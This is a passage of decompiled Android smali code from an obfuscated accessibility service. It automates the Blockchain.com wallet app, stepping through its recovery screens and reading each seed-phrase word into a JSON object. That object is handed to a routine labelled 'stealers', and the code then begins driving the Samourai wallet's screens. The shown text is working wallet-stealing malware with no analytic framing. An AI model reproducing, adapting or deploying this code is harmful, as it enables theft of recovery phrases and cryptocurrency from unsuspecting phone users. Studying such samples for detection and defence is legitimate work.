    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_96

    goto :goto_55

    :cond_96
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_97

    goto :goto_55

    :cond_97
    const/4 v3, 0x2

    const/4 v7, 0x0

    invoke-static {v1, v2, v7, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v13, 0x96

    invoke-virtual {v2, v13, v14}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_98

    goto :goto_55

    :cond_98
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_55
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_9a

    :cond_99
    :goto_56
    move-object/from16 v23, v5

    move-object/from16 v22, v8

    goto/16 :goto_66

    :cond_9a
    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v7

    move-object/from16 v13, v18

    invoke-static {v7, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_9b

    goto :goto_56

    :cond_9b
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_9c

    goto :goto_56

    :cond_9c
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_9d

    goto :goto_57

    :cond_9d
    invoke-virtual {v3}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_9e

    goto :goto_57

    :cond_9e
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_9f

    :goto_57
    const/4 v2, 0x3

    goto :goto_58

    :cond_9f
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2
    :try_end_35
    .catchall {:try_start_35 .. :try_end_35} :catchall_1c

    :goto_58
    add-int/lit8 v2, v2, -0x3

    if-ltz v2, :cond_99

    const/4 v3, 0x0

    :goto_59
    add-int/lit8 v7, v3, 0x1

    :try_start_36
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v14

    if-nez v14, :cond_a0

    goto :goto_5a

    :cond_a0
    sget-object v15, Lb0/b;->a:Lb0/b;

    invoke-virtual {v15}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v15

    invoke-static {v15, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v14

    if-nez v14, :cond_a1

    goto :goto_5a

    :cond_a1
    invoke-static {v14}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v14

    check-cast v14, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v14, :cond_a2

    goto :goto_5a

    :cond_a2
    invoke-virtual {v14, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v14

    if-nez v14, :cond_a3

    goto :goto_5a

    :cond_a3
    const/4 v15, 0x1

    invoke-virtual {v14, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v14

    if-nez v14, :cond_a4

    goto :goto_5a

    :cond_a4
    const/4 v15, 0x0

    invoke-virtual {v14, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v14

    if-nez v14, :cond_a5

    :goto_5a
    const/4 v14, 0x0

    goto :goto_5b

    :cond_a5
    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v14

    :goto_5b
    const-string v15, "android.widget.Switch"

    invoke-static {v14, v15}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v14

    invoke-static {v14}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v14
    :try_end_36
    .catchall {:try_start_36 .. :try_end_36} :catchall_15

    goto :goto_5c

    :catchall_15
    move-exception v0

    move-object v14, v0

    :try_start_37
    invoke-static {v14}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v14

    :goto_5c
    sget-object v15, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v14}, Lj0/d;->b(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_a6

    move-object v14, v15

    :cond_a6
    check-cast v14, Ljava/lang/Boolean;

    invoke-virtual {v14}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v14
    :try_end_37
    .catchall {:try_start_37 .. :try_end_37} :catchall_1c

    :try_start_38
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v15

    if-nez v15, :cond_a7

    move-object/from16 v22, v8

    goto :goto_5d

    :cond_a7
    sget-object v18, Lb0/b;->a:Lb0/b;
    :try_end_38
    .catchall {:try_start_38 .. :try_end_38} :catchall_17

    move-object/from16 v22, v8

    :try_start_39
    invoke-virtual/range {v18 .. v18}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v8

    invoke-static {v8, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v15, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_a8

    goto :goto_5d

    :cond_a8
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_a9

    goto :goto_5d

    :cond_a9
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_aa

    goto :goto_5d

    :cond_aa
    const/4 v15, 0x1

    invoke-virtual {v8, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_ab

    goto :goto_5d

    :cond_ab
    const/4 v15, 0x0

    invoke-virtual {v8, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_ac

    :goto_5d
    const/4 v8, 0x0

    goto :goto_5e

    :cond_ac
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v8

    :goto_5e
    const-string v15, "android.widget.Switch"

    invoke-static {v8, v15}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v8

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8
    :try_end_39
    .catchall {:try_start_39 .. :try_end_39} :catchall_16

    goto :goto_60

    :catchall_16
    move-exception v0

    goto :goto_5f

    :catchall_17
    move-exception v0

    move-object/from16 v22, v8

    :goto_5f
    move-object v8, v0

    :try_start_3a
    invoke-static {v8}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v8

    :goto_60
    sget-object v15, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v8}, Lj0/d;->b(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_ad

    move-object v8, v15

    :cond_ad
    check-cast v8, Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v8
    :try_end_3a
    .catchall {:try_start_3a .. :try_end_3a} :catchall_1a

    :try_start_3b
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v15

    if-nez v15, :cond_ae

    move-object/from16 v23, v5

    goto :goto_61

    :cond_ae
    sget-object v18, Lb0/b;->a:Lb0/b;
    :try_end_3b
    .catchall {:try_start_3b .. :try_end_3b} :catchall_19

    move-object/from16 v23, v5

    :try_start_3c
    invoke-virtual/range {v18 .. v18}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v15, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    if-nez v5, :cond_af

    goto :goto_61

    :cond_af
    invoke-static {v5}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v5, :cond_b0

    goto :goto_61

    :cond_b0
    add-int/lit8 v15, v3, 0x2

    invoke-virtual {v5, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-nez v5, :cond_b1

    goto :goto_61

    :cond_b1
    const/4 v15, 0x1

    invoke-virtual {v5, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-nez v5, :cond_b2

    goto :goto_61

    :cond_b2
    const/4 v15, 0x0

    invoke-virtual {v5, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-nez v5, :cond_b3

    :goto_61
    const/4 v5, 0x0

    goto :goto_62

    :cond_b3
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v5

    :goto_62
    const-string v15, "android.widget.Switch"

    invoke-static {v5, v15}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v5

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5
    :try_end_3c
    .catchall {:try_start_3c .. :try_end_3c} :catchall_18

    goto :goto_65

    :catchall_18
    move-exception v0

    :goto_63
    move-object v5, v0

    goto :goto_64

    :catchall_19
    move-exception v0

    move-object/from16 v23, v5

    goto :goto_63

    :goto_64
    :try_start_3d
    invoke-static {v5}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    move-result-object v5

    :goto_65
    sget-object v15, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v5}, Lj0/d;->b(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_b4

    move-object v5, v15

    :cond_b4
    check-cast v5, Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v14, :cond_b9

    if-eqz v5, :cond_b9

    if-nez v8, :cond_b9

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_b5

    goto :goto_66

    :cond_b5
    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_b6

    goto :goto_66

    :cond_b6
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_b7

    goto :goto_66

    :cond_b7
    invoke-virtual {v2, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_b8

    goto :goto_66

    :cond_b8
    const/16 v3, 0x10

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_66

    :cond_b9
    if-ne v3, v2, :cond_ba

    goto :goto_66

    :cond_ba
    move v3, v7

    move-object/from16 v8, v22

    move-object/from16 v5, v23

    goto/16 :goto_59

    :catchall_1a
    move-exception v0

    move-object/from16 v23, v5

    goto/16 :goto_72

    :goto_66
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_bb

    goto :goto_67

    :cond_bb
    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v4}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_bc

    goto :goto_67

    :cond_bc
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_bd

    goto :goto_67

    :cond_bd
    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v2, v4, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_67
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const/4 v3, 0x0

    :goto_68
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4
    :try_end_3d
    .catchall {:try_start_3d .. :try_end_3d} :catchall_1b

    const-string v5, ":id/button_next"

    if-nez v4, :cond_be

    goto :goto_69

    :cond_be
    :try_start_3e
    sget-object v7, Lb0/b;->a:Lb0/b;

    invoke-virtual {v7}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_bf

    :goto_69
    const/4 v4, 0x0

    goto :goto_6b

    :cond_bf
    invoke-interface {v4}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_c0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_c1

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    move-object v8, v7

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v8

    if-eqz v8, :cond_c0

    goto :goto_6a

    :cond_c1
    const/4 v7, 0x0

    :goto_6a
    move-object v4, v7

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_6b
    if-eqz v4, :cond_ce

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_c2

    goto :goto_6d

    :cond_c2
    sget-object v7, Lb0/b;->a:Lb0/b;

    invoke-virtual {v7}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_c3

    goto :goto_6d

    :cond_c3
    invoke-interface {v4}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_c4
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_c5

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    move-object v7, v5

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v7

    if-eqz v7, :cond_c4

    goto :goto_6c

    :cond_c5
    const/4 v5, 0x0

    :goto_6c
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v5, :cond_c6

    :goto_6d
    move-object/from16 v8, v24

    const-wide/16 v13, 0x1e

    goto/16 :goto_71

    :cond_c6
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_c7

    goto :goto_6e

    :cond_c7
    sget-object v7, Lb0/b;->a:Lb0/b;

    invoke-virtual {v7}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v7

    const-string v8, ":id/textview_word_counter"

    invoke-static {v7, v8}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-nez v4, :cond_c8

    goto :goto_6e

    :cond_c8
    invoke-static {v4}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v4, :cond_c9

    :goto_6e
    move-object/from16 v8, v24

    goto :goto_6f

    :cond_c9
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    move-object/from16 v8, v24

    invoke-static {v8, v7}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v3, v3, 0x1

    :goto_6f
    sget-object v4, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v13, 0x78

    invoke-virtual {v4, v13, v14}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_ca

    goto :goto_70

    :cond_ca
    sget-object v13, Lb0/b;->a:Lb0/b;

    invoke-virtual {v13}, Lb0/b;->h()Ljava/lang/String;

    move-result-object v13

    const-string v14, ":id/textview_current_word"

    invoke-static {v13, v14}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v7, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_cb

    goto :goto_70

    :cond_cb
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v7, :cond_cc

    goto :goto_70

    :cond_cc
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v13

    invoke-static {v9, v13}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v2, v13, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v3, v3, 0x1

    :goto_70
    const/4 v7, 0x2

    const/4 v13, 0x0

    invoke-static {v1, v5, v13, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    const-wide/16 v13, 0x1e

    invoke-virtual {v4, v13, v14}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-nez v4, :cond_cd

    goto :goto_71

    :cond_cd
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_71
    move-object/from16 v24, v8

    goto/16 :goto_68

    :cond_ce
    invoke-virtual {v2}, Lorg/json/JSONObject;->length()I

    move-result v3

    if-lez v3, :cond_d1

    sget-object v3, Lc0/b;->a:Lc0/b;

    const-string v4, "piuk.blockchain.android"

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v3, v1, v4, v2, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "piuk"

    const-string v3, "1"

    .line 21
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_cf

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_cf
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 22
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_3e
    .catchall {:try_start_3e .. :try_end_3e} :catchall_1b

    goto :goto_75

    :catchall_1b
    move-exception v0

    goto :goto_72

    :catchall_1c
    move-exception v0

    move-object/from16 v23, v5

    move-object/from16 v22, v8

    :goto_72
    move-object v2, v0

    goto :goto_73

    :catchall_1d
    move-exception v0

    move-object/from16 v23, v5

    move-object/from16 v22, v8

    move-object v3, v0

    goto :goto_74

    :cond_d0
    move-object/from16 v23, v5

    move-object/from16 v22, v8

    goto :goto_75

    :goto_73
    move-object v3, v2

    :goto_74
    invoke-static {v3}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_d1
    :goto_75
    :try_start_3f
    iget-object v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->i()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x2

    const/4 v7, 0x0

    invoke-static {v2, v4, v7, v5}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v2

    if-eqz v2, :cond_f5

    const-string v2, "samourai"

    .line 23
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_d2

    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_d2
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v5, 0x0

    invoke-interface {v4, v2, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_f5

    .line 24
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_d3

    goto :goto_76

    :cond_d3
    invoke-virtual {v3}, Lb0/b;->i()Ljava/lang/String;

    move-result-object v4

    const-string v5, ":id/skipClaim"

    invoke-static {v4, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_d4

    goto :goto_76

    :cond_d4
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_d5

    goto :goto_76

    :cond_d5
    const/4 v4, 0x2

    const/4 v5, 0x0

    invoke-static {v1, v2, v5, v4}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_76
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_d6

    goto :goto_77

    :cond_d6
    invoke-virtual {v3}, Lb0/b;->i()Ljava/lang/String;

    move-result-object v4

    const-string v5, ":id/action_scan_qr"

    invoke-static {v4, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_d7

    goto :goto_77

    :cond_d7
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_d8

    goto :goto_77

    :cond_d8
